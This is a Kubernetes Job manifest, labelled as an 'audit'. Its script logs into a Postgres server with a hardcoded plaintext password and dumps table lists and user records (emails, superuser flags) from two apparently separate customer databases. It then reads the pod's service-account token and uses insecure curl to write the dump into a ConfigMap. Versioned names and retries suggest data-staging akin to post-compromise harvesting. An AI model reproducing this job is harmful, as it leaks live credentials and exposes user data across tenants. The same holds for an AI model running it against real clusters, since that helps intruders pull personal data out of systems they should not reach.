apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v9
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q postgresql-client jq
          PG_HOST="172.16.10.14"
          PG_PASS="psJVV0VTF66hHUcH"
          
          echo "=TACHCORP_TABLES=" > /tmp/out.txt
          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "\dt" 2>&1 >> /tmp/out.txt
          echo "=TACHCORP_USERS=" >> /tmp/out.txt
          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1 >> /tmp/out.txt
          echo "=SIERRAREX_TABLES=" >> /tmp/out.txt
          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "\dt" 2>&1 >> /tmp/out.txt
          echo "=SIERRAREX_USERS=" >> /tmp/out.txt
          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1 >> /tmp/out.txt
          
          cat /tmp/out.txt
          
          # Write to existing ConfigMap dune-audit-result3
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          
          PAYLOAD=$(jq -n --rawfile content /tmp/out.txt '{"data":{"result":$content}}')
          
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/merge-patch+json" \
            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
            -d "$PAYLOAD" | jq '.metadata.name'
          
          sleep 90